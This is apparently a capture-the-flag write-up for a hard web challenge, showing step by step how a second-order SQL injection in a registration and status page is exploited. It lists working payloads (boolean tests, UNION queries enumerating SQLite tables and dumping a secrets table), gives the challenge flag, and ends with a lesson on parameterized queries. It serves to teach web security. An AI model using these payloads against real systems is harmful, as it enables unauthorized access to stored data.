# Duplicate Form

**Challenge title:** Formulaire en Double\
**Category:** Web\
**Difficulty:** Hard\
**Points:** 200\
**Author:** Perceval

## Target

- `https://formulaire-en-double.cyberzerk.fr`

## Solution

### Step 1: Understand the registration and status workflow

The application exposes two actions:

- `?action=register&username=...`
- `?action=status&id=N&t=JETON`

The page source contains a developer note explaining that the username is inserted using PDO during registration, but the status page rereads the stored username to display the role.

This suggests a possible second-order SQL injection: data accepted safely at registration may be used unsafely later.

### Step 2: Confirm the vulnerable status lookup

Registering a username consisting of a single quote (`'`) succeeds, but requesting its status produces a PHP warning:

```text
foreach() argument must be of type array|object, false given
in /app/index.php on line 52
```

A normal username returns `Rôle: stagiaire`. This controlled comparison indicates that the stored username affects the later database query.

### Step 3: Confirm boolean-based SQL injection

Register these usernames separately:

```text
' OR '1'='1
' OR '1'='2
```

The status output differs:

- `' OR '1'='1` returns an `admin` role followed by many `stagiaire` roles.
- `' OR '1'='2` returns only `stagiaire` roles.

The true condition causes the query to return multiple records, confirming SQL injection through the stored username.

### Step 4: Confirm UNION-based injection

Register:

```text
' UNION SELECT 'CyberZerk_TEST' -- 
```

The status page displays:

```text
Rôle: CyberZerk_TEST
Rôle: stagiaire
```

This confirms that a UNION result can be injected into the displayed role column.

### Step 5: Enumerate SQLite tables

Use SQLite's schema catalog:

```sql
' UNION SELECT name FROM sqlite_master WHERE type='table' -- 
```

The returned table names include:

```text
secrets
sqlite_sequence
stagiaire
users
```

### Step 6: Inspect the secrets table

Query the table definition:

```sql
' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='secrets' -- 
```

The application returns:

```sql
CREATE TABLE secrets(flag TEXT)
```

The flag is stored in the `flag` column of the `secrets` table.

### Step 7: Extract the flag

Register the following username:

```sql
' UNION SELECT flag FROM secrets -- 
```

Then request the status page using the ID and tracking token returned by registration.

The status output contains:

```text
Rôle: CyberZerk{s3c0nd_0rdr3_l3_payl0ad_d0rt_pu1s_s3_r3v31ll3}
Rôle: stagiaire
```

## Flag

```text
CyberZerk{s3c0nd_0rdr3_l3_payl0ad_d0rt_pu1s_s3_r3v31ll3}
```

## Security Lesson

Escaping or parameterizing data during insertion does not protect later queries that reuse the stored value. Every SQL statement must use parameterized queries, including queries that retrieve data using previously stored user input. Database errors should also be handled without exposing internal paths or warnings.
